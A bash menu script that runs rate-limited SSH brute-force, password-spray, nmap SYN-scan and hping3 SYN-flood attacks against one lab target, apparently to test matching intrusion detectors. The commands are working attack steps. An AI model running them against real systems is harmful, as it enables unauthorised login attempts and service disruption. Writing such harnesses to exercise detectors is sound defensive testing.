#!/bin/bash
# Attacker laptop (A, or a second attacker laptop): a menu of the Layer-1 attacks, all aimed ONLY at T (T_IP in multi/config.env).
# Rate-limited on purpose: this is a demonstration, not a stress tool. Needs: hydra nmap hping3 curl (sudo apt install hydra nmap hping3 curl).
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
. "$ROOT/multi/common.sh"
[ -n "${T_IP:-}" ] || { echo "T_IP missing in multi/config.env"; exit 1; }
printf 'password\n123456\nadmin\nletmein\nqwerty\nwelcome\n' > /tmp/pw.txt
reach() { timeout 4 bash -c "exec 3<>/dev/tcp/$T_IP/22" 2>/dev/null && echo "T port 22: STILL OPEN" || echo "T port 22: BLOCKED (this laptop is cut off)"; }
while true; do
cat <<M

 Attack menu  (target $T_IP, this laptop $A_IP)
  1  SSH brute force            (hydra, 4 threads)          -> detector: ssh_parser
  2  Slow brute force / spray   (1 try every 5 s, 3 users)  -> detector: login_watch  (needs LOGIN_WATCH=1)
  3  Port scan                  (nmap)                      -> detector: flood_detector (needs FLOOD=1)
  4  SYN flood, 5 seconds       (hping3, 200 pkt/s)         -> detector: flood_detector (needs FLOOD=1)
  5  Is T still reachable from here?
  q  quit
M
read -rp " choose: " c
case "$c" in
  1) hydra -l testuser -P /tmp/pw.txt -t 4 ssh://"$T_IP"; reach ;;
  2) for u in testuser admin guest; do for p in password 123456; do hydra -l $u -p $p -t 1 ssh://"$T_IP" >/dev/null 2>&1; echo "tried $u/$p"; sleep 5; done; done; reach ;;
  3) sudo nmap -sS -p 1-1000 -T4 "$T_IP"; reach ;;
  4) sudo timeout 5 hping3 -S -p 22 -i u5000 "$T_IP" >/dev/null 2>&1; reach ;;
  5) reach ;;
  q) exit 0 ;;
esac
done
